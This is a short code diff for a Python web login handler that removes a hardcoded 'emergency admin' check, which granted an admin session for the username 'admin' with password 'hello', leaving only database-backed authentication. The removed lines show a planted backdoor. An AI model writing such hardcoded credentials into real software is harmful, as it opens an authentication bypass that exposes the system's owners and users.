@@ -37,20 +37,14 @@ async def index(request: Request):
         username = data['username']
         password = data['password']
         
-        # Check for emergency admin access first
-        if username == "admin" and password == "hello":
-            emergency_admin = User.get_emergency_admin()
-            session['user_id'] = emergency_admin.id
-            auth_user = emergency_admin
+        # Authenticate user via database
+        async with app['db'].acquire() as conn:
+            user = await User.get_by_username_legacy(conn, username)
+        if user and user.check_password(password):
+            session['user_id'] = user.id
+            auth_user = user
         else:
-            async with app['db'].acquire() as conn:
-                # Use legacy method for backward compatibility
-                user = await User.get_by_username_legacy(conn, username)
-            if user and user.check_password(password):
-                session['user_id'] = user.id
-                auth_user = user
-            else:
-                errors.append('Invalid username or password')
+            errors.append('Invalid username or password')
     return {'last_visited': last_visited,
             'errors': errors,
             'auth_user': auth_user}
